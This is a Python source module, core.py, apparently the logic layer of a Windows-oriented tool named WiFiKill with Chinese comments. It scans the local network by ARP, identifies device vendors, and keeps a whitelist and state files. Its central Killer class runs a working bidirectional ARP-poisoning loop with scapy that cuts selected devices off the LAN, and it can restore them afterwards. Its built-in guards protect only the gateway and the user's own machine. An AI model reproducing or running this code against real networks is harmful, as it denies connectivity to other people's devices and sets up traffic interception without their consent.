#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
core.py — WiFiKill 逻辑层

职责：网络发现、ARP 阻断、白名单与状态持久化、环境自检。
约束：不向 stdout 输出任何内容（GUI 打包为 --windowed 时 stdout 为 None），
      所有消息通过 logger 回调派发。
"""

from __future__ import annotations

import json
import logging
import os
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, asdict
from pathlib import Path

WINDOWS = os.name == "nt"
BROADCAST = "ff:ff:ff:ff:ff:ff"
APP_NAME = "WiFiKill"
APP_VERSION = "2.3.1"

if getattr(sys, "frozen", False):
    APP_DIR = Path(sys.executable).resolve().parent
else:
    APP_DIR = Path(__file__).resolve().parent

STATE_FILE = APP_DIR / ".wifikill-state.json"
WHITELIST_FILE = APP_DIR / "whitelist.txt"
ALIAS_FILE = APP_DIR / "aliases.json"   # 设备备注：mac/ip → 名字
LOCK_PORT = 51999

_MAC_RE = re.compile(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$")
_IP_RE = re.compile(r"^(\d{1,3}\.){3}\d{1,3}$")


# ------------------------------------------------------------------ 基础工具


def log_levels():
    return ("debug", "info", "ok", "warn", "err")


class Logger:
    """线程安全的回调式日志；无订阅者时静默。"""

    def __init__(self):
        self._sinks = []
        self._lock = threading.Lock()

    def subscribe(self, fn):
        with self._lock:
            self._sinks.append(fn)

    def emit(self, level: str, msg: str):
        with self._lock:
            sinks = list(self._sinks)
        for fn in sinks:
            try:
                fn(level, msg)
            except Exception:
                pass


LOG = Logger()


def resource_path(name: str) -> str:
    """取随包分发的资源文件路径。

    PyInstaller onefile 会把资源解到 sys._MEIPASS，源码运行时就在脚本旁边。
    """
    base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
    path = os.path.join(base, name)
    return path if os.path.exists(path) else ""


def _run_hidden(cmd: list[str], encoding: str) -> str:
    """执行外部命令且不弹出控制台窗口（GUI 打包必需）。"""
    kwargs = {}
    if WINDOWS:
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    try:
        p = subprocess.run(cmd, capture_output=True, encoding=encoding,
                           errors="replace", timeout=10, **kwargs)
        return p.stdout or ""
    except Exception:
        return ""


# ------------------------------------------------------------------ 厂商库

BUILTIN_OUI = {
    "000C29": "VMware", "005056": "VMware", "000569": "VMware",
    "080027": "VirtualBox", "0A0027": "VirtualBox",
    "001C42": "Parallels", "525400": "QEMU/KVM", "00163E": "Xen",
    "00155D": "Microsoft Hyper-V",
    "B827EB": "Raspberry Pi", "DCA632": "Raspberry Pi", "E45F01": "Raspberry Pi",
    "240AC4": "Espressif", "30AEA4": "Espressif", "7C9EBD": "Espressif",
    "84F3EB": "Espressif", "AC67B2": "Espressif", "C44F33": "Espressif",
    "3C6105": "Espressif", "8CAAB5": "Espressif", "246F28": "Espressif",
    "001D0F": "TP-Link", "50C7BF": "TP-Link", "A42BB0": "TP-Link",
    "14CC20": "TP-Link", "C46E1F": "TP-Link",
    "001B63": "Apple", "0023DF": "Apple", "001EC2": "Apple",
    "3C0754": "Apple", "68A86D": "Apple", "8C8590": "Apple",
    "A483E7": "Apple", "F01898": "Apple", "D0817A": "Apple",
    "0012FB": "Samsung", "3423BA": "Samsung", "5C0A5B": "Samsung",
    "8C7712": "Samsung", "C0BDD1": "Samsung", "E8508B": "Samsung",
    "286C07": "Xiaomi", "64B473": "Xiaomi", "7811DC": "Xiaomi",
    "508F4C": "Xiaomi", "34CE00": "Xiaomi", "F8A45F": "Xiaomi",
    "00E0FC": "Huawei", "4846FB": "Huawei", "70723C": "Huawei",
    "8853D4": "Huawei", "ACE215": "Huawei", "D07AB5": "Huawei",
    "001B21": "Intel", "3C970E": "Intel", "8C1645": "Intel",
    "001E37": "Hewlett-Packard", "00248C": "ASUSTek",
}

VENDOR_TYPE = [
    (("apple", "xiaomi", "samsung", "huawei", "oppo", "vivo", "oneplus",
      "realme", "meizu", "honor"), "移动设备"),
    (("espressif", "raspberry"), "智能家居"),
    (("tp-link", "tenda", "netgear", "asus", "h3c", "ruijie"), "网络设备"),
    (("vmware", "virtualbox", "qemu", "xen", "parallels", "hyper-v"), "虚拟机"),
    (("intel", "realtek", "hewlett", "dell", "lenovo", "micro-star"), "电脑"),
]

_oui_cache: dict[str, str] | None = None
_oui_lock = threading.Lock()


def oui_table(extra_path: str | None = None) -> dict[str, str]:
    global _oui_cache
    with _oui_lock:
        if _oui_cache is None:
            _oui_cache = dict(BUILTIN_OUI)
            if extra_path:
                _merge_oui(_oui_cache, extra_path)
        return _oui_cache


def _merge_oui(table: dict, path: str):
    p = Path(path)
    if not p.exists():
        LOG.emit("warn", f"OUI 文件不存在：{p}")
        return
    n = 0
    for line in p.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "," in line:
            parts = [x.strip() for x in line.split(",")]
            if len(parts) >= 3 and re.fullmatch(r"[0-9A-Fa-f]{6}", parts[1]):
                table[parts[1].upper()] = parts[2]
                n += 1
        else:
            parts = line.split(None, 1)
            if len(parts) == 2:
                key = parts[0].replace(":", "").replace("-", "").upper()
                if re.fullmatch(r"[0-9A-F]{6}", key):
                    table[key] = parts[1]
                    n += 1
    LOG.emit("info", f"已加载自定义 OUI {n} 条")


def lookup_vendor(mac: str, table: dict[str, str]) -> str:
    prefix = mac.replace(":", "").upper()[:6]
    if not prefix or prefix in ("000000", "FFFFFF"):
        return "—"
    if prefix in table:
        return table[prefix]
    try:
        if int(prefix[1], 16) & 0x2:
            return "随机 MAC"
    except ValueError:
        pass
    return "—"


def guess_type(vendor: str) -> str:
    v = vendor.lower()
    if vendor == "随机 MAC":
        return "移动设备?"
    for keys, label in VENDOR_TYPE:
        if any(k in v for k in keys):
            return label
    return "—"


# ------------------------------------------------------------------ 环境


_scapy = None
_scapy_lock = threading.Lock()


def scapy_mod():
    global _scapy
    with _scapy_lock:
        if _scapy is None:
            logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
            logging.getLogger("scapy.loading").setLevel(logging.ERROR)
            try:
                import scapy.all as s
                _scapy = s
            except Exception as e:
                LOG.emit("err", f"scapy 加载失败：{e}")
                return None
        return _scapy


def scapy_version() -> str:
    try:
        import scapy
        return getattr(scapy, "VERSION", "?")
    except Exception:
        return "?"


def is_admin() -> bool:
    if not WINDOWS:
        try:
            return os.geteuid() == 0
        except Exception:
            return False
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def l2_check() -> tuple[str, str]:
    """返回 (阻断码, 说明)。

    只判定"确定无法工作"的条件：ok / no_scapy / no_npcap。
    不提管理员：Npcap 的驱动权限因安装选项而异，实测存在非管理员可发送的情况，
    以管理员为硬门槛会造成假阴性。真实权限不足会在 sendp 时以异常暴露。
    """
    s = scapy_mod()
    if s is None:
        return "no_scapy", "scapy 未加载"
    if WINDOWS:
        try:
            use_pcap = s.conf.use_pcap
        except Exception:
            use_pcap = False
        if not use_pcap:
            return "no_npcap", "未安装 Npcap（发送二层帧必需）"
    return "ok", "ok"


def relaunch_elevated(extra_args: list[str] | None = None) -> bool:
    if not WINDOWS or is_admin():
        return False
    try:
        import ctypes
        target = sys.executable
        args = list(extra_args or [])
        params = subprocess.list2cmdline(args)
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", target, params, None, 1)
        return rc > 32
    except Exception:
        return False


# ------------------------------------------------------------------ 网络信息


@dataclass
class NetInfo:
    iface: str = ""
    my_ip: str = ""
    my_mac: str = ""
    gateway_ip: str = ""
    gateway_mac: str = ""
    cidr: str = ""
    iface_name: str = ""

    @property
    def ready(self) -> bool:
        return bool(self.my_ip and self.gateway_ip)


def friendly_iface(npif: str) -> str:
    """把 \\Device\\NPF_{GUID} 换成可读的网卡描述。"""
    s = scapy_mod()
    if s is not None and npif:
        try:
            for iface in s.conf.ifaces.values():
                if getattr(iface, "network_name", "") == npif:
                    desc = (getattr(iface, "description", "") or "").strip()
                    alias = (getattr(iface, "name", "") or "").strip()
                    if desc and alias:
                        return f"{alias} · {desc}"
                    return desc or alias or npif
        except Exception:
            pass
    return npif


def local_mac() -> str:
    if WINDOWS:
        out = _run_hidden(["getmac", "/fo", "csv", "/nh"], "gbk")
        for line in out.splitlines():
            m = re.search(r"([0-9A-F]{2}-){5}[0-9A-F]{2}", line, re.I)
            if m:
                return m.group(0).replace("-", ":").lower()
    return "00:00:00:00:00:00"


def cidr_range(cidr: str) -> tuple[int, int]:
    try:
        net_s, _, plen_s = cidr.partition("/")
        plen = int(plen_s or 24)
        mask = (0xFFFFFFFF << (32 - plen)) & 0xFFFFFFFF
        ip_int = struct.unpack("!I", socket.inet_aton(net_s))[0]
        return ip_int & mask, mask
    except Exception:
        return 0, 0


def same_subnet(ip: str, cidr: str) -> bool:
    net, mask = cidr_range(cidr)
    if mask == 0:
        return True
    try:
        return (struct.unpack("!I", socket.inet_aton(ip))[0] & mask) == net
    except Exception:
        return False


def get_netinfo(cidr: str | None = None) -> NetInfo:
    s = scapy_mod()
    ni = NetInfo()
    if s is not None:
        try:
            iface, my_ip, gw = s.conf.route.route("0.0.0.0")
            ni.iface, ni.my_ip, ni.gateway_ip = iface, my_ip, gw
            try:
                ni.my_mac = s.get_if_hwaddr(iface)
            except Exception:
                pass
        except Exception as e:
            LOG.emit("warn", f"路由探测失败：{e}")
    if not ni.my_mac or ni.my_mac == "00:00:00:00:00:00":
        ni.my_mac = local_mac()

    prefix, net_int = 24, None
    if s is not None and ni.my_ip:
        try:
            ip_int = struct.unpack("!I", socket.inet_aton(ni.my_ip))[0]
            best = None
            for net, mask, _g, _ifc, addr, _m in s.conf.route.routes:
                if addr != ni.my_ip or net == 0:
                    continue
                if bin(mask).count("1") >= 31:
                    continue
                if (ip_int & mask) == (net & mask):
                    if best is None or bin(mask).count("1") > bin(best).count("1"):
                        best = mask
            if best:
                prefix = bin(best).count("1")
                net_int = ip_int & best
        except Exception as e:
            LOG.emit("debug", f"网段探测异常：{e}")

    if ni.iface:
        ni.iface_name = friendly_iface(ni.iface)

    if cidr:
        ni.cidr = cidr
    elif net_int is not None:
        ni.cidr = f"{socket.inet_ntoa(struct.pack('!I', net_int))}/{prefix}"
    elif ni.my_ip:
        ni.cidr = f"{ni.my_ip}/24"
    return ni


def arp_table() -> dict[str, str]:
    if WINDOWS:
        out = _run_hidden(["arp", "-a"], "gbk")
    else:
        out = _run_hidden(["arp", "-an"], "utf-8")
    table: dict[str, str] = {}
    for line in out.splitlines():
        m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})\D+((?:[0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2})", line)
        if not m:
            continue
        ip, mac = m.group(1), m.group(2).replace("-", ":").lower()
        if mac == BROADCAST or mac.startswith("01:00:5e"):
            continue
        if ip.startswith(("224.", "239.", "255.")):
            continue
        table[ip] = mac
    return table


# ------------------------------------------------------------------ 设备


@dataclass
class Device:
    ip: str
    mac: str
    vendor: str = "—"
    dtype: str = "—"
    note: str = ""
    state: str = "未阻断"


def is_protected(d: Device) -> bool:
    """设备是否受保护（网关 / 本机）。受保护设备在任何路径下都不可被阻断。

    这是安全不变量：阻断网关会切断整个网络，阻断本机会让自己失联。
    单目标选择与「全阻断」都必须遵守，因此抽成纯函数并纳入测试。
    """
    return d.note in ("网关", "本机")


def scan(ni: NetInfo, timeout: float = 3.0, active: bool = True) -> tuple[list[Device], bool]:
    """返回 (设备列表, 是否包含主动扫描结果)

    主动扫描可能比系统 ARP 缓存少（休眠设备不回 ARP），因此两路结果合并，
    主动结果覆盖缓存结果，避免漏设备。
    """
    cached = {ip: mac for ip, mac in arp_table().items()
              if same_subnet(ip, ni.cidr)}
    active_found: dict[str, str] = {}
    if active:
        s = scapy_mod()
        code, _ = l2_check()
        if s is not None and code == "ok":
            try:
                pkt = s.Ether(dst=BROADCAST) / s.ARP(pdst=ni.cidr)
                ans, _ = s.srp(pkt, timeout=timeout, iface=ni.iface,
                               verbose=0, inter=0.01)
                for _, r in ans:
                    active_found[r.psrc] = r.hwsrc.lower()
            except Exception as e:
                LOG.emit("debug", f"主动扫描失败：{e}")

    found = dict(cached)
    found.update(active_found)
    used_active = bool(active_found)

    table = oui_table()
    devs = []
    for ip, mac in sorted(found.items(), key=lambda x: tuple(map(int, x[0].split(".")))):
        v = lookup_vendor(mac, table)
        d = Device(ip=ip, mac=mac, vendor=v, dtype=guess_type(v))
        if ip == ni.gateway_ip:
            d.note = "网关"
        elif ip == ni.my_ip:
            d.note = "本机"
        devs.append(d)
    return devs, used_active


def arp_query(ip: str, ni: NetInfo) -> str | None:
    s = scapy_mod()
    code, _ = l2_check()
    if s is None or code != "ok":
        return None
    try:
        ans, _ = s.srp(s.Ether(dst=BROADCAST) / s.ARP(pdst=ip),
                       timeout=2, iface=ni.iface, verbose=0)
        for _, r in ans:
            return r.hwsrc.lower()
    except Exception:
        pass
    return None


def resolve_mac(ip: str, ni: NetInfo) -> str | None:
    if ip == ni.my_ip:
        return ni.my_mac
    if ip == ni.gateway_ip and ni.gateway_mac:
        return ni.gateway_mac
    mac = arp_table().get(ip)
    if mac:
        return mac
    mac = arp_query(ip, ni)
    if mac:
        return mac
    # 回退：全段扫一次
    try:
        devs, _ = scan(ni, 2.0, active=True)
        for d in devs:
            if d.ip == ip:
                return d.mac
    except Exception:
        pass
    return None


# ------------------------------------------------------------------ 状态持久化


_state_lock = threading.Lock()


def load_state() -> dict:
    try:
        if STATE_FILE.exists():
            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
    except Exception as e:
        LOG.emit("warn", f"状态文件损坏，已忽略：{e}")
    return {}


def write_state(data: dict | None):
    """原子写入；data 为 None 表示删除。"""
    with _state_lock:
        try:
            if not data or not data.get("targets"):
                if STATE_FILE.exists():
                    STATE_FILE.unlink()
                return
            tmp = STATE_FILE.with_suffix(".tmp")
            tmp.write_text(json.dumps(data, indent=2), encoding="utf-8")
            os.replace(tmp, STATE_FILE)
        except Exception as e:
            LOG.emit("warn", f"状态写入失败：{e}")


def clear_state():
    write_state(None)


def load_whitelist() -> set[str]:
    if not WHITELIST_FILE.exists():
        return set()
    out = set()
    for line in WHITELIST_FILE.read_text(encoding="utf-8", errors="replace").splitlines():
        line = line.strip().lower()
        if line and not line.startswith("#"):
            out.add(line)
    return out


def load_aliases() -> dict[str, str]:
    """读设备备注。键是 MAC 或 IP，值是用户起的名字。"""
    try:
        data = json.loads(ALIAS_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}
    out = {}
    for k, v in (data or {}).items():
        if isinstance(v, str) and v.strip():
            out[str(k).lower()] = v.strip()
    return out


def save_aliases(items: dict[str, str]) -> None:
    """原子写备注，避免崩溃留下半个 JSON。"""
    tmp = ALIAS_FILE.with_suffix(".tmp")
    tmp.write_text(json.dumps(items, ensure_ascii=False, indent=2),
                   encoding="utf-8")
    os.replace(tmp, ALIAS_FILE)


def save_whitelist(items: set[str]):
    try:
        WHITELIST_FILE.write_text(
            "\n".join(sorted(items)) + ("\n" if items else ""), encoding="utf-8")
    except Exception as e:
        LOG.emit("warn", f"白名单写入失败：{e}")


# ------------------------------------------------------------------ 阻断器


@dataclass
class Target:
    ip: str
    mac: str
    note: str = ""

    def key(self) -> str:
        return self.ip


class BlockError(RuntimeError):
    pass


class Killer:
    """ARP 双向投毒会话。所有失败都以 BlockError / 日志呈现，不静默。"""

    def __init__(self, ni: NetInfo, interval: float = 1.5, dry_run: bool = False):
        self.ni = ni
        self.interval = max(0.3, float(interval))
        self.dry_run = dry_run
        self._targets: dict[str, Target] = {}
        self._lock = threading.RLock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._started = False
        self._send_errors = 0

    # --- 状态 ---

    def targets(self) -> list[Target]:
        with self._lock:
            return list(self._targets.values())

    def is_active(self) -> bool:
        return self._thread is not None and self._thread.is_alive() and not self._stop.is_set()

    # --- 报文 ---

    def _frames(self, t: Target, restore: bool):
        s = scapy_mod()
        if s is None:
            raise BlockError("scapy 不可用")
        gw_ip, gw_mac = self.ni.gateway_ip, self.ni.gateway_mac
        if not _MAC_RE.match(gw_mac or ""):
            raise BlockError(f"网关 MAC 无效（{gw_mac!r}），拒绝投毒")
        if not _MAC_RE.match(t.mac or ""):
            raise BlockError(f"目标 MAC 无效（{t.mac!r}）")
        src = gw_mac if restore else self.ni.my_mac
        src_t = t.mac if restore else self.ni.my_mac
        to_target = (s.Ether(dst=t.mac) /
                     s.ARP(op=2, hwsrc=src, psrc=gw_ip, hwdst=t.mac, pdst=t.ip))
        to_gw = (s.Ether(dst=gw_mac) /
                 s.ARP(op=2, hwsrc=src_t, psrc=t.ip, hwdst=gw_mac, pdst=gw_ip))
        return to_target, to_gw

    def _emit(self, t: Target, restore: bool = False, count: int = 1):
        s = scapy_mod()
        frames = self._frames(t, restore)
        for f in frames:
            if self.dry_run:
                LOG.emit("debug", f"[演练] 告知 {f[1].pdst} ← {f[1].psrc} 的 MAC 是 {f[1].hwsrc}")
                continue
            try:
                s.sendp(f, iface=self.ni.iface, verbose=0, count=count)
            except Exception as e:
                self._send_errors += 1
                raise BlockError(f"发送失败：{e}") from e

    # --- 生命周期 ---

    def start(self):
        with self._lock:
            if self.is_active():
                return
            self._stop.clear()
            self._thread = threading.Thread(target=self._loop, daemon=True,
                                            name="wifikill-poison")
            self._started = True
            self._thread.start()

    def _loop(self):
        while not self._stop.is_set():
            with self._lock:
                targets = list(self._targets.values())
            for t in targets:
                if self._stop.is_set():
                    break
                try:
                    self._emit(t)
                except BlockError as e:
                    LOG.emit("warn", f"{t.ip} {e}")
                except Exception as e:
                    LOG.emit("warn", f"{t.ip} 投毒异常：{e}")
            self._stop.wait(self.interval)

    def _is_protected_target(self, t: Target) -> bool:
        """目标是否指向网关 / 本机（IP 或 MAC 命中其一即拒绝，与 is_protected 同源）。

        这是安全不变量的 API 层强制：GUI 已经过滤过一次，但这里必须再挡一道 ——
        任何直接调用 core 的代码路径（插件、脚本、未来的 UI）都不能绕过这道门。

        为什么 IP 与 MAC 要「独立」判定（对抗性审查第 4 轮由回归测试逼出）：
        - 用网关 IP 作目标：to_target 的 psrc=gw_ip，等于告诉全网「网关 IP → 攻击方 MAC」，全家断网。
        - 用网关 MAC 作目标（IP 随便）：帧的以太 dst 是网关 MAC、且 psrc=gw_ip，
          网关会收到一条「我自己(gw_ip) 在攻击方 MAC 上」的 ARP 应答，污染网关自身映射。
        - 本机同理。所以只要 IP 或 MAC 任一命中网关/本机，就必须拒绝。
        """
        ni = self.ni
        t_mac = (t.mac or "").lower()
        bad_ips = {ni.gateway_ip, ni.my_ip}
        bad_macs = {(ni.gateway_mac or "").lower(), (ni.my_mac or "").lower()}
        if t.ip in bad_ips:
            return True
        if t_mac and t_mac in bad_macs:
            return True
        return False

    def add(self, t: Target) -> None:
        if not self._started and not self.dry_run:
            code, _ = l2_check()
            if code != "ok":
                raise BlockError("二层不可用，无法阻断")
        # 安全不变量在 API 层强制：网关 / 本机在任何路径下都不可被阻断。
        if self._is_protected_target(t):
            raise BlockError("受保护设备（网关/本机）不可被阻断")
        self._frames(t, restore=False)   # 先验证报文可构造
        with self._lock:
            self._targets[t.key()] = t
        self._emit(t, count=3)
        self.persist()

    def remove(self, ip: str) -> bool:
        with self._lock:
            t = self._targets.pop(ip, None)
        if t:
            try:
                self._emit(t, restore=True, count=5)
            except Exception as e:
                LOG.emit("warn", f"恢复 {ip} 失败：{e}")
                # 恢复失败要放回队列，避免"以为放行了其实还断着"
                with self._lock:
                    self._targets[ip] = t
                return False
        self.persist()
        return True

    def restore_all(self) -> int:
        """停止并恢复全部目标，返回成功条数。"""
        self.stop()
        with self._lock:
            items = list(self._targets.values())
            self._targets.clear()
        ok = 0
        for t in items:
            try:
                self._emit(t, restore=True, count=5)
                ok += 1
            except Exception as e:
                LOG.emit("warn", f"恢复 {t.ip} 失败：{e}")
                with self._lock:
                    self._targets[t.ip] = t
        if not self._targets:
            clear_state()
        else:
            self.persist()
        return ok

    def stop(self):
        self._stop.set()
        th = self._thread
        if th and th.is_alive():
            th.join(timeout=3)

    def persist(self):
        if self.dry_run:
            return          # 演练模式只打印报文，绝不能留下阻断状态
        with self._lock:
            items = [asdict(t) for t in self._targets.values()]
        write_state({
            "updated": time.time(),
            "iface": self.ni.iface,
            "my_mac": self.ni.my_mac,
            "gateway_ip": self.ni.gateway_ip,
            "gateway_mac": self.ni.gateway_mac,
            "targets": items,
        })


# ------------------------------------------------------------------ 单实例锁


class SingleInstance:
    """用本地端口做互斥，避免两个实例互相覆盖状态文件。"""

    def __init__(self, port: int = LOCK_PORT):
        self.port = port
        self.sock: socket.socket | None = None

    def acquire(self) -> bool:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if WINDOWS:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_EXCLUSIVEADDRUSE, 1)
            else:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
            s.bind(("127.0.0.1", self.port))
            s.listen(1)
            self.sock = s
            return True
        except OSError:
            return False

    def release(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
            self.sock = None
